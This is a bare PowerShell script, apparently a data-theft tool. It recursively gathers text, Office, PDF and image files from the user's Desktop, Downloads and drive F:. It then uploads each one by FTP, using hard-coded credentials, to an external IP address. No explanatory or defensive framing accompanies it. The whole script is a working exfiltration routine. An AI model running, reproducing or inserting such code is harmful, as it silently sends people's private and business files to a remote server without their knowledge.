
$FTP = "ftp://testadmin:testpassword@192.119.71.89/files/"
$Dir = "C:\Users\$env:username\desktop","C:\Users\$env:username\Downloads","F:\"
$web=New-Object System.Net.WebClient

foreach($item in (Get-ChildItem $Dir -Include *.txt,*.xlsx,*.pdf,*.ppt,*.docx,*.jpeg,*.jpg,*.png -Recurse)){
    $URI = New-Object System.Uri($FTP+$item.Name)
    $web.UploadFile($URI, $item.FullName)
}

